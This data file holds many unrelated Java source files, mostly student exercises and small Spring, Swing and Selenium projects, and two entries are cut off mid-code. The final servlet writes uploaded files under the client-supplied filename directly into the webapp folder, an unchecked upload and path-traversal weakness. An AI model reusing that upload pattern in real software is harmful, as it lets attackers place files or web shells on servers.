    "package kr.com.ezen;\n\nimport java.text.DateFormat;\nimport java.util.Date;\nimport java.util.Locale;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.ui.Model;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestMethod;\n\n/**\n * Handles requests for the application home page.\n */\n@Controller\npublic class HomeController {\n\t\n\tprivate static final Logger logger = LoggerFactory.getLogger(HomeController.class);\n\t\n\t/**\n\t * Simply selects the home view to render by returning its name.\n\t */\n\t@RequestMapping(value = \"/\", method = RequestMethod.GET)\n\tpublic String home(Locale locale, Model model) {\n\t\tlogger.info(\"Welcome home! The client locale is {}.\", locale);\n\t\t\n\t\tDate date = new Date();\n\t\tDateFormat dateFormat = DateFormat.getDateTimeInstance(DateFormat.LONG, DateFormat.LONG, locale);\n\t\t\n\t\tString formattedDate = dateFormat.format(date);\n\t\t\n\t\tmodel.addAttribute(\"serverTime\", formattedDate );\n\t\t\n\t\treturn \"home\";\n\t}\n\t\n}\n",
    "import java.util.*;\n\npublic class index {\n    static class BigGridelement {\n        char[][] grid;\n        char whoses = ' ';\n        boolean checker = false;\n    }\n\n    public static void game(BigGridelement[][] grid) {\n\n    }\n\n    public static void print(char[][] arr) {\n        for (int i = 0; i < 9; i++) {\n            \n        }\n    }\n\n    public static boolean smallerGrid(char[][] matrix) {\n\n        return false;\n    }\n\n    public static void whereto(int x, int y) {\n\n    }\n\n    public static char finalcheck(BigGridelement bg0, BigGridelement bg1, BigGridelement bg2, BigGridelement bg3,\n            BigGridelement bg4, BigGridelement bg5, BigGridelement bg6, BigGridelement bg7, BigGridelement bg8,\n            char whoses) {\n\n        // --- test\n        if (((bg0.checker && bg1.checker && bg2.checker) || (bg3.checker && bg4.checker && bg5.checker)\n                || (bg6.checker && bg7.checker && bg8.checker)) && whoses == 'X') {\n            return 'X';\n        } else if (((bg0.checker && bg1.checker && bg2.checker) || (bg3.checker && bg4.checker && bg5.checker)\n                || (bg6.checker && bg7.checker && bg8.checker)) && whoses == 'O') {\n            return 'O';\n        }\n\n        // ||| test\n        else if (((bg0.checker && bg3.checker && bg6.checker) || (bg1.checker && bg4.checker && bg7.checker)\n                || (bg2.checker && bg5.checker && bg8.checker)) && whoses == 'X') {\n            return 'X';\n        } else if (((bg0.checker && bg3.checker && bg6.checker) || (bg1.checker && bg4.checker && bg7.checker)\n                || (bg2.checker && bg5.checker && bg8.checker)) && whoses == 'O') {\n            return 'O';\n        }\n\n        // /// test\n        else if ((bg3.checker && bg5.checker && bg7.checker) && whoses == 'X') {\n            return 'X';\n        } else if ((bg3.checker && bg5.checker && bg7.checker) && whoses == 'O') {\n            return 'O';\n        }\n\n        // \\\\\\ test\n        else if ((bg0.checker && bg5.checker && bg8.checker) && whoses == 'X') {\n            return 'X';\n        } else if ((bg0.checker && bg5.checker && bg8.checker) && whoses == 'O') {\n            return 'O';\n        }\n\n        return 'N';\n\n    }\n\n    public static void changewhoses(BigGridelement a, char turn) {\n        if (a.whoses == ' ') {\n            a.whoses = turn;\n        } else {\n            System.out.println(\"This place is already taken!\");\n        }\n    }\n\n    public static void main(String[] args) {\n        BigGridelement bg0 = new BigGridelement();\n        BigGridelement bg1 = new BigGridelement();\n        BigGridelement bg2 = new BigGridelement();\n        BigGridelement bg3 = new BigGridelement();\n        BigGridelement bg4 = new BigGridelement();\n        BigGridelement bg5 = new BigGridelement();\n        BigGridelement bg6 = new BigGridelement();\n        BigGridelement bg7 = new BigGridelement();\n        BigGridelement bg8 = new BigGridelement();\n\n        bg0.grid = new char[3][3];\n        bg1.grid = new char[3][3];\n        bg2.grid = new char[3][3];\n        bg3.grid = new char[3][3];\n        bg4.grid = new char[3][3];\n        bg5.grid = new char[3][3];\n        bg6.grid = new char[3][3];\n        bg7.grid = new char[3][3];\n        bg8.grid = new char[3][3];\n\n        BigGridelement[][] grid = new BigGridelement[3][3];\n        grid[0][0] = bg0;\n        grid[0][1] = bg1;\n        grid[0][2] = bg2;\n        grid[1][0] = bg3;\n        grid[1][1] = bg4;\n        grid[1][2] = bg5;\n        grid[2][0] = bg6;\n        grid[2][1] = bg7;\n        grid[2][2] = bg8;\n\n        game(grid);\n\n    }\n}",
    "package com.example.tp3_ilyass;\n\nimport com.example.tp3_ilyass.entities.Patient;\nimport com.example.tp3_ilyass.repository.PatientRepository;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\n\nimport java.util.Calendar;\nimport java.util.Date;\n\n@SpringBootApplication\npublic class Tp3IlyassApplication implements CommandLineRunner {\n    @Autowired\n    private PatientRepository patientRepository;\n\n    public static void main(String[] args) {\n        SpringApplication.run(Tp3IlyassApplication.class, args);\n    }\n\n\n    @Override\n    public void run(String... args) throws Exception {\n\n        // Create Patient using no args constructor\n        Patient patient = new Patient();\n        patient.setId(null);\n        patient.setSick(true);\n        patient.setName(\"Ilyass\");\n        patient.setBirthDate(new Date(120, Calendar.NOVEMBER, 14));\n        patient.setScore(7899);\n\n        // Create patient using all args constructor\n        Patient patient1 = new Patient(null, \"Shouttyy\", new Date(122, Calendar.DECEMBER, 12), false, 22);\n\n        // Create patient using the builder\n        Patient patient2 = Patient.builder()\n                .name(\"Bruuh\")\n                .birthDate(new Date(100, Calendar.APRIL, 28))\n                .score(230)\n                .sick(true)\n                .build();\n\n        // Add Patients to patientRepository\n        patientRepository.save(patient);\n        patientRepository.save(patient1);\n        patientRepository.save(patient2);\n\n\n    }\n}\n",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class EntryPage extends JFrame implements ActionListener {\n    private JButton adminButton;\n    private JButton customerButton;\n\n    public EntryPage() {\n        setTitle(\"Entry Page\");\n        setSize(300, 150);\n        setDefaultCloseOperation(EXIT_ON_CLOSE);\n        setLocationRelativeTo(null);\n\n        JPanel panel = new JPanel();\n        panel.setLayout(new GridLayout(2, 1, 10, 10));\n\n        adminButton = new JButton(\"Admin\");\n        adminButton.addActionListener(this);\n        customerButton = new JButton(\"Customer\");\n        customerButton.addActionListener(this);\n\n        panel.add(adminButton);\n        panel.add(customerButton);\n\n        // Add padding around the panel\n        panel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));\n\n        add(panel);\n        setVisible(true);\n    }\n\n    @Override\n    public void actionPerformed(ActionEvent e) {\n        if (e.getSource() == adminButton) {\n            // Handle admin button click\n            new AdminPage(); // Open admin page\n            dispose(); // Close the entry page\n        } else if (e.getSource() == customerButton) {\n            // Handle customer button click\n            // You can redirect to the main page of the customer here\n            new Customer();\n            dispose();\n        }\n    }\n\n    public static void main(String[] args) {\n        SwingUtilities.invokeLater(EntryPage::new);\n    }\n}\n",
    "\npackage trabajopractico4lab1;\n\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport javax.swing.JOptionPane;\n\n\n/**\n *\n * @author sevas\n */\npublic class Convertidor extends javax.swing.JFrame {\n\n    public Convertidor() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jLabel2 = new javax.swing.JLabel();\n        jLabel1 = new javax.swing.JLabel();\n        jtcelcius = new javax.swing.JTextField();\n        jSeparator2 = new javax.swing.JSeparator();\n        jLabel3 = new javax.swing.JLabel();\n        jbConvertir = new javax.swing.JButton();\n        jtFahranheit = new javax.swing.JTextField();\n        jSeparator3 = new javax.swing.JSeparator();\n        jLabel4 = new javax.swing.JLabel();\n        jSeparator4 = new javax.swing.JSeparator();\n        jLabel5 = new javax.swing.JLabel();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        setTitle(\"Convertidor\");\n        setLocationByPlatform(true);\n        setPreferredSize(new java.awt.Dimension(453, 458));\n        setSize(new java.awt.Dimension(453, 431));\n\n        jPanel1.setBackground(new java.awt.Color(102, 102, 102));\n\n        jLabel2.setFont(new java.awt.Font(\"Segoe UI\", 1, 24)); // NOI18N\n        jLabel2.setForeground(new java.awt.Color(102, 204, 0));\n        jLabel2.setText(\"Convertidor de Temperatura\");\n\n        jLabel1.setFont(new java.awt.Font(\"Segoe UI\", 1, 14)); // NOI18N\n        jLabel1.setForeground(new java.awt.Color(102, 204, 0));\n        jLabel1.setText(\"Temperatura :\");\n\n        jtcelcius.setBackground(new java.awt.Color(102, 102, 102));\n        jtcelcius.setFont(new java.awt.Font(\"Segoe UI\", 1, 14)); // NOI18N\n        jtcelcius.setForeground(new java.awt.Color(102, 204, 0));\n        jtcelcius.setBorder(null);\n\n        jSeparator2.setBackground(new java.awt.Color(102, 204, 0));\n\n        jLabel3.setBackground(new java.awt.Color(102, 204, 0));\n        jLabel3.setFont(new java.awt.Font(\"Segoe UI\", 1, 14)); // NOI18N\n        jLabel3.setForeground(new java.awt.Color(102, 204, 0));\n        jLabel3.setText(\"\u00b0C\");\n\n        jbConvertir.setBackground(new java.awt.Color(102, 102, 102));\n        jbConvertir.setFont(new java.awt.Font(\"Segoe UI\", 1, 18)); // NOI18N\n        jbConvertir.setForeground(new java.awt.Color(102, 204, 0));\n        jbConvertir.setText(\"Convertir\");\n        jbConvertir.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(102, 204, 0)));\n        jbConvertir.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jbConvertirActionPerformed(evt);\n            }\n        });\n\n        jtFahranheit.setEditable(false);\n        jtFahranheit.setBackground(new java.awt.Color(102, 102, 102));\n        jtFahranheit.setFont(new java.awt.Font(\"Segoe UI\", 1, 18)); // NOI18N\n        jtFahranheit.setForeground(new java.awt.Color(102, 204, 0));\n        jtFahranheit.setBorder(null);\n\n        jLabel4.setBackground(new java.awt.Color(102, 102, 102));\n        jLabel4.setFont(new java.awt.Font(\"Segoe UI\", 1, 14)); // NOI18N\n        jLabel4.setForeground(new java.awt.Color(102, 204, 0));\n        jLabel4.setText(\"\u00baF\");\n\n        jLabel5.setFont(new java.awt.Font(\"Segoe UI\", 1, 14)); // NOI18N\n        jLabel5.setForeground(new java.awt.Color(102, 204, 0));\n        jLabel5.setText(\"Temperatura :\");\n\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel1Layout.createSequentialGroup()\n                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(jPanel1Layout.createSequentialGroup()\n                        .addGap(94, 94, 94)\n                        .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n                            .addComponent(jbConvertir, javax.swing.GroupLayout.PREFERRED_SIZE, 207, javax.swing.GroupLayout.PREFERRED_SIZE)\n                            .addGroup(jPanel1Layout.createSequentialGroup()\n                                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n                                    .addGroup(jPanel1Layout.createSequentialGroup()\n                                        .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 106, javax.swing.GroupLayout.PREFERRED_SIZE)\n          ",
    "package com.example.springsecuritywebflux.Service;\n\n\nimport com.example.springsecuritywebflux.Exception.AuthenticationFailedException;\nimport com.example.springsecuritywebflux.Models.User;\nimport com.example.springsecuritywebflux.Repositories.UserRepository;\nimport com.example.springsecuritywebflux.dto.AuthRequest;\nimport com.example.springsecuritywebflux.dto.AuthResponse;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.security.authentication.ReactiveAuthenticationManager;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.core.GrantedAuthority;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.security.web.authentication.AuthenticationConverter;\nimport org.springframework.stereotype.Service;\nimport reactor.core.publisher.Mono;\n\nimport java.util.Collection;\n\n@Service\n@RequiredArgsConstructor\npublic class AuthService {\n\n    private final UserRepository repository;\n    //private final ReactiveAuthenticationManager authenticationManager;\n    private final JwtService jwtService;\n    private final PasswordEncoder passwordEncoder;\n\n    public Mono<ResponseEntity<AuthResponse>> auth(AuthRequest request) {\n\n        Mono<User> foundUser = repository.findByEmail(request.getEmail()).defaultIfEmpty( new User() {\n\n            @Override\n            public Collection<? extends GrantedAuthority> getAuthorities() {\n                return null;\n            }\n\n            @Override\n            public String getPassword() {\n                return null;\n            }\n\n            @Override\n            public String getUsername() {\n                return null;\n            }\n\n            @Override\n            public boolean isAccountNonExpired() {\n                return false;\n            }\n\n            @Override\n            public boolean isAccountNonLocked() {\n                return false;\n            }\n\n            @Override\n            public boolean isCredentialsNonExpired() {\n                return false;\n            }\n\n            @Override\n            public boolean isEnabled() {\n                return false;\n            }\n\n        })  ;\n\n        return   foundUser.map(u->{\n            if(u.getEmail()==null){\n                return  ResponseEntity.status(404).body(new AuthResponse(\"not token\",\"email not exist\"));\n            }\n            else{\n                if(passwordEncoder.matches(request.getPassword(),u.getPassword())){\n\n                    return\n                            ResponseEntity.ok(\n                                    new AuthResponse(jwtService.generateToken(request.getEmail()),\"200\")\n                            );\n\n                }\n                return ResponseEntity.status(HttpStatus.UNAUTHORIZED)\n                        .body(new AuthResponse(\"email or password wrong\",\"404\"));\n            }\n\n        });\n    }\n\n\n    public Mono<String> register(User user){\n        String email = user.getEmail();\n\n        return repository.existsByEmail(email).\n                flatMap((alreadyExist->{\n                            if(alreadyExist) return Mono.just(\"User Already exist in Database\") ;\n\n                            else {\n                                user.setPassword(passwordEncoder.encode(user.getPassword()));\n                                return repository.save(user)\n                                        .thenReturn(\"User registered!!\");\n                            }\n                        }\n\n\n                        )\n                );\n    }\n\n}\n",
    "package application;\n\nimport java.util.HashSet;\nimport java.util.Scanner;\nimport java.util.Set;\n\npublic class Program {\n\n\tpublic static void main(String[] args) {\n\t\n\t\tScanner sc = new Scanner(System.in);\n\t\t\n\t\tSet<Integer> a = new HashSet<>();\n\t\tSet<Integer> b = new HashSet<>();\n\t\tSet<Integer> c = new HashSet<>();\n\t\t\n\t\t//Students for course A\n\t\tSystem.out.print(\"How many students for course A? \");\n\t\tint n = sc.nextInt();\n\t\tfor (int i=0;i<n;i++) {\n\t\t\tint number = sc.nextInt();\n\t\t\ta.add(number);\n\t\t}\n\t\t\n\t\t//Students for course B\n\t\tSystem.out.print(\"How many students for course B? \");\n\t\tn = sc.nextInt();\n\t\tfor (int i=0;i<n;i++) {\n\t\t\tint number = sc.nextInt();\n\t\t\tb.add(number);\n\t\t}\n\t\t\n\t\t//Students for course C\n\t\tSystem.out.print(\"How many students for course C? \");\n\t\tn = sc.nextInt();\n\t\tfor (int i=0;i<n;i++) {\n\t\t\tint number = sc.nextInt();\n\t\t\tc.add(number);\n\t\t}\n\t\t\n\t\tSet<Integer> total = new HashSet<>(a);\n\t\ttotal.addAll(b);\n\t\ttotal.addAll(c);\n\t\t\n\t\tSystem.out.println(\"Total students: \" + total.size());\n\t\t\n\t\t\n\t\tsc.close();\n\t}\n\n}\n",
    "package com.ivantrykosh.app.parallel_genetic_algorithm.knapsack;\n\nimport com.ivantrykosh.app.parallel_genetic_algorithm.Constants;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic final class Items {\n    private static volatile Items instance;\n\n    private final List<Item> items = new ArrayList<>();\n\n    private Items(int numberOfItems, int maxItemWeight, int maxItemValue) {\n        for (int i = 0; i < numberOfItems; i++) {\n            Item newItem = new Item(maxItemWeight, maxItemValue);\n            items.add(newItem);\n        }\n    }\n\n    public List<Item> getItems() {\n        return items;\n    }\n\n    public static Items getInstance() {\n        if (instance != null) {\n            return instance;\n        }\n        synchronized (Items.class) {\n            if (instance == null) {\n                instance = new Items(Constants.NUMBER_OF_ITEMS, Constants.MAX_ITEM_WEIGHT, Constants.MAX_ITEM_VALUE);\n            }\n            return instance;\n        }\n    }\n\n    @Override\n    public String toString() {\n        return items.toString();\n    }\n}\n",
    "package study.with.sw.backend.config;\n\nimport jdk.jfr.Description;\nimport lombok.Builder;\nimport lombok.Getter;\nimport org.springframework.http.HttpStatus;\n\n@Getter\n@Builder // \ud0dd\ubc30 \ud3ec\uc7a5\uc744 \ud55c\ub2e4\n@Description(\"API \uc751\ub2f5 \uacf5\ud1b5 \ubaa8\ub4c8\")\npublic class ApiResponse {\n    private int status; // \uc751\ub2f5 \uc0c1\ud0dc(\ubc30\uc1a1\uc0c1\ud0dc)\n    private  String message; //  \uc751\ub2f5 \uba54\uc2dc\uc9c0(\ubc30\uc1a1 \uba54\uc2dc\uc9c0)\n    private Object data; // Object: \uc5b4\ub5a0\ud78c \uac83\uc774\ub4e0 \ub420 \uc218 \uc788\uc744\ub54c  / \uc2e4\uc81c \ub4e4\uc5b4\uac00\ub294 \ub370\uc774\ud130\ub4e4 (\ubc30\uc1a1\ubb3c)\n\n    @Description(\"API \uc131\uacf5 \uc751\ub2f5(\ub370\uc774\ud130 \ud544\uc694\uc5c6\uc74c)\")\n    public  static ApiResponse ok(){\n        return ApiResponse.builder()\n                .status(HttpStatus.OK.value())\n                .message(HttpStatus.OK.getReasonPhrase())\n                .build();\n    }\n\n    @Description(\"API \uc131\uacf5 \uc751\ub2f5(\ub370\uc774\ud130\uac00 \uc788\uc74c)\")\n    public  static ApiResponse success(Object data){\n        return ApiResponse.builder()\n                .status(HttpStatus.OK.value())\n                .message(HttpStatus.OK.getReasonPhrase())\n                .data(data)\n                .build();\n    }\n\n    @Description(\"API \uc2e4\ud328 \uc751\ub2f5(\ub370\uc774\ud130\uac00 \ud544\uc694\uc5c6\uc74c)\")\n    public  static ApiResponse error(HttpStatus status, String message){\n        return ApiResponse.builder()\n                .status(status.value())\n                .message(message)\n                .build();\n    }\n}\n",
    "package application;\n\nimport java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.text.ParseException;\nimport java.util.LinkedHashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class Program {\n\n\tpublic static void main(String[] args) throws ParseException {\n\n\t\tScanner sc = new Scanner(System.in);\n\n\t\tMap<String, Integer> votes = new LinkedHashMap<>();\n\t\t\n\t\tSystem.out.print(\"Enter file full path: \");\n\t\tString path = sc.nextLine();\n\t\t\n\t\ttry(BufferedReader br = new BufferedReader(new FileReader(path))){\n\t\t\t\n\t\t\tString line = br.readLine();\n\t\t\twhile(line != null) {\n\t\t\t\t\n\t\t\t\tString[] fields = line.split(\",\");\n\t\t\t\tString name = fields[0];\n\t\t\t\tint count = Integer.parseInt(fields[1]);\n\t\t\t\t\n\t\t\t\tif(votes.containsKey(name)) {\n\t\t\t\t\tint votesSoFar = votes.get(name);\n\t\t\t\t\tvotes.put(name, count + votesSoFar);\n\t\t\t\t} else {\n\t\t\t\t\tvotes.put(name, count);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tline = br.readLine();\n\t\t\t}\n\t\t\t\n\t\t\tfor(String key : votes.keySet()) {\n\t\t\t\tSystem.out.println(key + \": \" + votes.get(key));\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tSystem.out.println(\"Error: \" + e.getMessage());\n\t\t}\n\t\t\n\t\tsc.close();\n\t}\n}",
    "package pages;\n\nimport org.openqa.selenium.WebElement;\nimport org.openqa.selenium.support.FindBy;\nimport org.openqa.selenium.support.PageFactory;\nimport utilities.Driver;\n\npublic class TestOtomasyonuFormPage {\n\n    public TestOtomasyonuFormPage(){\n        PageFactory.initElements(Driver.getDriver(),this);\n    }\n\n    @FindBy(xpath = \"(//select[@class='form-control'])[1]\")\n    public WebElement gunDropdownElementi;\n\n    @FindBy(xpath = \"(//select[@class='form-control'])[2]\")\n    public WebElement ayDropdownElementi;\n\n    @FindBy(xpath = \"(//select[@class='form-control'])[3]\")\n    public WebElement yilDropdownElementi;\n\n    @FindBy(xpath = \"//*[@for='gridCheck5']\")\n    public WebElement sirtAgrisiYaziElementi;\n\n    @FindBy(xpath = \"//*[@id='gridCheck5']\")\n    public WebElement sirtAgrisiCheckbox;\n\n    @FindBy(xpath = \"//*[@id='gridCheck4']\")\n    public WebElement carpintiCheckbox;\n\n    @FindBy(xpath = \"//*[@id='hastalikCheck2']\")\n    public WebElement sekerCheckbox;\n\n    @FindBy(xpath = \"//*[@id='hastalikCheck7']\")\n    public WebElement epilepsiCheckbox;\n}\n",
    "package com.cake.cmodels.core.types;\n\n/**\n * Generic Vec2 type (independent of mc) <br/>\n * Note that it is <strong>mutable</strong>, and returns are only for chaining, so that it may be modified by transformers, <br/>\n * Also note that a {@link GenericVec2#copy()} method is available <br/>\n * Subtypes of both Vec2 and Vec3 are used to avoid type misuse and for clarity in types<br>\n * but are safe to cast to super then down again,<br/>\n * */\npublic class GenericVec2 {\n    float x, y;\n    public GenericVec2(float x, float y) {\n        this.x = x;\n        this.y = y;\n    }\n\n    //Copy method since this is\n    public GenericVec2 copy() {\n        return new GenericVec2(x, y);\n    }\n\n    //Vector functions\n    /**Slower than {@link GenericVec2#getMagnitudeSquared()}*/\n    public float getMagnitude() {\n        return (float) Math.sqrt(this.getMagnitudeSquared());\n    }\n\n    /**Faster than {@link GenericVec2#getMagnitude()}*/\n    public float getMagnitudeSquared() {\n        return (float) (Math.pow(this.x, 2) + Math.pow(this.y, 2));\n    }\n\n    public float dot(GenericVec2 other) {\n        return this.multiply(other).getSum();\n    }\n\n    public float getSum() {\n        return this.x + this.y;\n    }\n\n    public GenericVec2 rotate(float angle) {\n        this.x = (float) (Math.cos(angle) * this.x - Math.sin(angle) * this.y);\n        this.y = (float) (Math.sin(angle) * this.x + Math.cos(angle) * this.y);\n        return this;\n    }\n\n    //Component manipulation functions\n    public GenericVec2 add(GenericVec2 other) {\n        this.x += other.x;\n        this.y += other.y;\n        return this;\n    }\n\n    public GenericVec2 addAll(float l) {\n        this.x += l;\n        this.y += l;\n        return this;\n    }\n\n    public GenericVec2 subtract(GenericVec2 other) {\n        this.x -= other.x;\n        this.y -= other.y;\n        return this;\n    }\n\n    public GenericVec2 subtractAll(float l) {\n        this.x -= l;\n        this.y -= l;\n        return this;\n    }\n\n    public GenericVec2 div(GenericVec2 other) {\n        this.x /= other.x;\n        this.y /= other.y;\n        return this;\n    }\n\n    public GenericVec2 divAll(float l) {\n        this.x /= l;\n        this.y /= l;\n        return this;\n    }\n\n    public GenericVec2 multiply(GenericVec2 other) {\n        this.x *= other.x;\n        this.y *= other.y;\n        return this;\n    }\n\n    public GenericVec2 multiplyAll(float l) {\n        this.x *= l;\n        this.y *= l;\n        return this;\n    }\n\n    //Direct setters\n    public GenericVec2 setX(float x) {\n        this.x = x;\n        return this;\n    }\n    public GenericVec2 setY(float y) {\n        this.y = y;\n        return this;\n    }\n\n    //Getters\n    public float getX() {\n        return x;\n    }\n    public float getY() {\n        return y;\n    }\n\n}\n",
    "import java.text.DecimalFormat;\r\n\r\npublic class SinhVien {\r\n    private int MSSV;\r\n    private String hoTen;\r\n    private double diemGiaiTich = 0;\r\n    private double diemVatLy = 0;\r\n    private double diemNhapMonLapTrinh = 0;\r\n    private double diemTB = 0;\r\n\r\n    public void setMSSV(int mssv) {\r\n        this.MSSV = mssv;\r\n    }\r\n\r\n    public int getMSSV() {\r\n        return this.MSSV;\r\n    }\r\n\r\n    public void setHoTen(String hoten) {\r\n        this.hoTen = hoten;\r\n    }\r\n\r\n    public String getHoTen() {\r\n        return this.hoTen;\r\n    }\r\n\r\n    public void setDiemGiaiTich(double score) {\r\n        this.diemGiaiTich = score;\r\n        this.diemTB = (this.diemGiaiTich + this.diemNhapMonLapTrinh + this.diemVatLy) / 3;\r\n    }\r\n\r\n    public double getDiemGiaiTich() {\r\n        return this.diemGiaiTich;\r\n    }\r\n\r\n    public void setDiemVatLy(double score) {\r\n        this.diemVatLy = score;\r\n        this.diemTB = (this.diemGiaiTich + this.diemNhapMonLapTrinh + this.diemVatLy) / 3;\r\n    }\r\n\r\n    public double getDiemVatLy() {\r\n        return this.diemVatLy;\r\n    }\r\n\r\n    public void setDiemNhapMonLapTrinh(double score) {\r\n        this.diemNhapMonLapTrinh = score;\r\n        this.diemTB = (this.diemGiaiTich + this.diemNhapMonLapTrinh + this.diemVatLy) / 3;\r\n    }\r\n\r\n    public double getDiemNhapMonLapTrinh() {\r\n        return this.diemNhapMonLapTrinh;\r\n    }\r\n\r\n    public double getDiemTB() {\r\n        return this.diemTB;\r\n    }\r\n\r\n    public void getToanBoThongTinSinhVien() {\r\n        DecimalFormat df = new DecimalFormat(\".##\");\r\n        System.out.println(\r\n                this.MSSV + \"\\t\" + this.hoTen + \"\\t\" + df.format(this.diemGiaiTich) + \"\\t\" +\r\n                        df.format(this.diemVatLy) + \"\\t\" + df.format(this.diemNhapMonLapTrinh) + \"\\t\"\r\n                        + df.format(this.diemTB) + \"\\t\");\r\n    }\r\n}\r\n",
    "package dev.damene.customerservice.web;\n\nimport dev.damene.customerservice.entities.Customer;\nimport dev.damene.customerservice.repository.CustomerRepository;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport java.util.List;\n\n@RestController\npublic class CustomerRestController {\n    private final CustomerRepository customerRepository;\n\n    public CustomerRestController(CustomerRepository customerRepository) {\n        this.customerRepository = customerRepository;\n    }\n\n    @GetMapping(\"/customers\")\n    public List<Customer> customerList() {\n        return customerRepository.findAll();\n    }\n\n    @GetMapping(\"/customers/{id}\")\n    public Customer customerByID(@PathVariable Long id) {\n        return customerRepository.findById(id).orElseThrow(() -> new RuntimeException(\"Customer not found\"));\n    }\n}\n",
    "package com.Servlet;\r\n\r\nimport java.io.File;\r\nimport java.io.FileOutputStream;\r\nimport java.io.IOException;\r\nimport java.io.InputStream;\r\nimport java.io.OutputStream;\r\nimport java.io.PrintWriter;\r\nimport java.sql.Connection;\r\nimport java.sql.PreparedStatement;\r\nimport jakarta.servlet.ServletException;\r\nimport jakarta.servlet.annotation.MultipartConfig;\r\nimport jakarta.servlet.annotation.WebServlet;\r\nimport jakarta.servlet.http.HttpServlet;\r\nimport jakarta.servlet.http.HttpServletRequest;\r\nimport jakarta.servlet.http.HttpServletResponse;\r\nimport jakarta.servlet.http.Part;\r\n\r\n@MultipartConfig\r\n@WebServlet(\"/\")\r\npublic class ApplicationFormServlet extends HttpServlet {\r\n\tprivate static final long serialVersionUID = 1L;\r\n\r\n\tpublic ApplicationFormServlet() {\r\n\t\tsuper();\r\n\t}\r\n\r\n\t@Override\r\n\tprotected void doPost(HttpServletRequest request, HttpServletResponse response)\r\n\t\t\tthrows ServletException, IOException {\r\n\r\n\t\tresponse.setContentType(\"text/html;charset=UTF-8\");\r\n\t\tPrintWriter out = response.getWriter();\r\n\r\n\t\tString name = null, caste = null, cert_name = null, sub1 = null, sub2 = null, sub3 = null, sub4 = null,\r\n\t\t\t\tsub5 = null;\r\n\r\n\t\tname = request.getParameter(\"nm\");\r\n\t\tcaste = request.getParameter(\"cst\");\r\n\t\tsub1 = request.getParameter(\"sub1\");\r\n\t\tsub2 = request.getParameter(\"sub2\");\r\n\t\tsub3 = request.getParameter(\"sub3\");\r\n\t\tsub4 = request.getParameter(\"sub4\");\r\n\t\tsub5 = request.getParameter(\"sub5\");\r\n\r\n\t\tSystem.out.println(\"name: \" + name);\r\n\t\tSystem.out.println(\"caste: \" + caste);\r\n\t\tSystem.out.println(\"Subject1: \" + sub1);\r\n\t\tSystem.out.println(\"Subject2: \" + sub2);\r\n\t\tSystem.out.println(\"Subject3: \" + sub3);\r\n\t\tSystem.out.println(\"Subject4: \" + sub4);\r\n\t\tSystem.out.println(\"Subject5: \" + sub5);\r\n\r\n\t\tif (!caste.equals(\"gen\")) {\r\n\t\t\t// Get the file part from request\r\n\t\t\tPart filePart = request.getPart(\"files\");\r\n\r\n\t\t\tString fileName = filePart.getSubmittedFileName();\r\n\t\t\tcert_name = fileName;\r\n\r\n\t\t\tString currentFolder = \"E:\\\\SpringFrameworkDurgesh\\\\SessionLoginProj\\\\src\\\\main\\\\webapp\\\\document\\\\\";\r\n\t\t\tString uploadFolder = currentFolder;\r\n\r\n\t\t\tFile folder = new File(uploadFolder);\r\n\t\t\tif (!folder.exists()) {\r\n\t\t\t\tfolder.mkdirs();\r\n\t\t\t}\r\n\r\n\t\t\ttry (InputStream input = filePart.getInputStream();\r\n\t\t\t\t\tOutputStream output = new FileOutputStream(new File(uploadFolder, fileName))) {\r\n\r\n\t\t\t\tbyte[] buffer = new byte[1024];\r\n\t\t\t\tint bytesRead;\r\n\r\n\t\t\t\twhile ((bytesRead = input.read(buffer)) != -1) {\r\n\t\t\t\t\toutput.write(buffer, 0, bytesRead);\r\n\t\t\t\t}\r\n\t\t\t\tSystem.out.println(\"file uploaded.\" + uploadFolder);\r\n\t\t\t} catch (Exception e) {\r\n\t\t\t\te.printStackTrace();\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tdbConnect obj = new dbConnect();\r\n\t\tString query = \"insert into studentdetails(std_name, std_caste, cert_name, 